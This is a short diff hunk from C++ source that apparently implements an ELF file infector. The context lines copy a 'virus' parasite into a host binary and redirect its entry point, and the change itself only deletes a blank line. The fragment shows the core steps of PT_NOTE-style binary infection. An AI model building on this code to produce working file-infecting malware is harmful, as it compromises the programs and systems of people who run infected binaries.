@@ -163,7 +163,6 @@ bool PtNoteInfector::inject(std::span<std::byte> host_mapping,
   // Inject the virus.
   vt::memcpy(&host_mapping[virus_offset_], &parasite_mapping.front(),
              parasite_mapping.size());
-
   return common::redirect_elf_entry_point(
       original_e_entry_, parasite_load_address_, virus_offset_,
       parasite_mapping.size(), host_mapping);
